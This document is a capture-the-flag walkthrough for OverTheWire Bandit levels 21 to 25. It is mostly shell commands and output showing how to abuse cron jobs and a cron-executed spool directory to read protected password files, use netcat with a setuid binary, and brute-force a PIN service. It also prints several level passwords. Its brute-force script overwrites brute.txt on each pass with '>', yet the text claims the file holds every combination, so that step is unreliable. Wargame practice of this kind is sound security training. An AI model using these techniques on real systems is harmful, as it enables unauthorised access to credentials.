# OverTheWire Bandit

### Lvl 21-25

---

**Lvl 21**

"There is a setuid binary in the homedirectory that does the
following: it makes a connection to localhost on the port you
specify as a commandline argument. It then reads a line of text from
the connection and compares it to the password in the previous level
(bandit20). If the password is correct, it will transmit the
password for the next level (bandit21)."

We are using the `echo` command to display a line of text (here the password from the previous lvl) and pipe it into netcat to listen to a random port (here i choose 6666) and then background it with `&`

```bash
bandit20@bandit:~$ echo -n "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -l -p 6666 &
```

Now, if we run the setuid binary in the home directory with the port 6666, it will connect to the netcat server, read the password we write and send the next password.

```bash
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect 6666
Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
Password matches, sending next password
password_is_here
[3]-  Done
```

---

**Lvl 22**

"A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed."

First let's look what is in the `/etc/cron.d` directory.

```bash
bandit21@bandit:/etc/cron.d$ ls -l
total 40
-r--r----- 1 root root  47 Oct 14 09:26 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Oct 14 09:19 clean_tmp
-rw-r--r-- 1 root root 120 Oct 14 09:26 cronjob_bandit22
-rw-r--r-- 1 root root 122 Oct 14 09:26 cronjob_bandit23
-rw-r--r-- 1 root root 120 Oct 14 09:26 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Oct 14 09:27 leviathan5_cleanup
-rw------- 1 root root 138 Oct 14 09:28 manpage3_resetpw_job
-rwx------ 1 root root  52 Oct 14 09:29 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

Here, the conjob_bandit22 is the interesting one, let's print it.

```bash
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

This conjob run the /usr/bin/conjob_bandit22.sh file every minutes (due to the five stars) as the user: bandit22. Let's print this bash file.

```bash
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

It create a file in the /tmp directory, give him the permissions to be read by everyone (4), and then proceed to print the password for the lvl 22 sotred in /etc/bandit_pass/bandit22 (a file we can't read) directly in this file. We just have to print this new file to retrieve the password.

```bash
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

---

**Lvl 23**

"A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed."

First let's look what is in the `/etc/cron.d` directory.

```bash
bandit22@bandit:/etc/cron.d$ ls -l
total 40
-r--r----- 1 root root  47 Oct 14 09:26 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Oct 14 09:19 clean_tmp
-rw-r--r-- 1 root root 120 Oct 14 09:26 cronjob_bandit22
-rw-r--r-- 1 root root 122 Oct 14 09:26 cronjob_bandit23
-rw-r--r-- 1 root root 120 Oct 14 09:26 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Oct 14 09:27 leviathan5_cleanup
-rw------- 1 root root 138 Oct 14 09:28 manpage3_resetpw_job
-rwx------ 1 root root  52 Oct 14 09:29 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

Here, the conjob_bandit23 is the interesting one, let's print it.

```bash
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

Let's look at the /usr/bin/cronjob_bandit23.sh file.

```bash
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

This script take the output of `whoami`, then go the /etc/bandit_pass/output to copy the password and paste it into a file locate in the /tmp directory. The file is created by the  line: `echo I am user $myname | md5sum | cut -d ' ' -f 1`. To get the bandit23 password, we have to replace `$myname` variable with `bandit23` and then print the new file in /tmp.

```bash
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
password_is_here
```

The conjob runs a script that copies each user's password from `/etc/bandit_pass/<user>` into `/tmp/<md5_hash>`. The name of the file is the MD5 hash of the string `"I am user <username>"` minus the "-" at the end. To get the password for another user (here: bandit23), i just replace `$myname` with `bandit23`, get the hash and found the corresponding file in the /tmp directory.

---

**Lvl 24**

"A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed."

First let's look what is in the `/etc/cron.d` directory.

```bash
bandit23@bandit:/etc/cron.d$ ls -l
total 40
-r--r----- 1 root root  47 Oct 14 09:26 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Oct 14 09:19 clean_tmp
-rw-r--r-- 1 root root 120 Oct 14 09:26 cronjob_bandit22
-rw-r--r-- 1 root root 122 Oct 14 09:26 cronjob_bandit23
-rw-r--r-- 1 root root 120 Oct 14 09:26 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Oct 14 09:27 leviathan5_cleanup
-rw------- 1 root root 138 Oct 14 09:28 manpage3_resetpw_job
-rwx------ 1 root root  52 Oct 14 09:29 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

Here, the conjob_bandit24 is the interesting one, let's print it.

```bash
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Let's look at the /usr/bin/cronjob_bandit24.sh file.

```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

The script executes and delete all the scripts in /var/spool/$myname/foo. In the "if" statement, we can see the code to execute a script if the owner of this one is bandit23, then delete it. To get the password for next level, we have to create a script who will print the password for bandit24 stored in /etc/bandit_pass/bandit24, and send it to a directory in /tmp previously created.

First let's create a directory in /tmp and write the script.

```bash
bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.qQYtGEv3NR
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.qQYtGEv3NR
bandit23@bandit:/tmp/tmp.qQYtGEv3NR$ nano script.sh
```

The script:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.qQYtGEv3NR/password.txt
```

Now let's give permission tothe script and the directory.

```bash
bandit23@bandit:/tmp/tmp.qQYtGEv3NR$ chmod +x script.sh 
bandit23@bandit:/tmp/tmp.qQYtGEv3NR$ chmod 777 .
bandit23@bandit:/tmp/tmp.qQYtGEv3NR$ ls -l
```

We now have to copy the script in /var/spool/bandit24/foo

```bash
bandit23@bandit:/tmp/tmp.qQYtGEv3NR$ cp script.sh /var/spool/bandit24/foo
```

Now when listing the file in this directory, we see a new file: password.txt, just need to print it to get the password.

```bash
bandit23@bandit:/tmp/tmp.qQYtGEv3NR$ ls
password.txt  script.sh
bandit23@bandit:/tmp/tmp.qQYtGEv3NR$ cat password.txt
password_is_here
```

---

**Lvl 25**

"A daemon is listening on port 30002 and will give you the password for
bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time"

First, let's connect to the port 30002 with `nc`

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 6756
Wrong! Please enter the correct current password and pincode. Try again.
```

We have to brute force  the pincode using a script.

```bash
#!/bin/bash
for i in {0000..9999}
do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" > brute.txt;
done
```

and now we have the brute.txt file with all the possible combination. Let's use the `cat` command to print this file and pipe the output to netcat on the port 30002.

```bash
bandit24@bandit:/tmp/tmp.0FVzw8uOmR$ cat brute.txt | nc localhost 30002
Wrong! Please enter the correct current password and pincode. Try again.
[...]
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is password_is_here
```


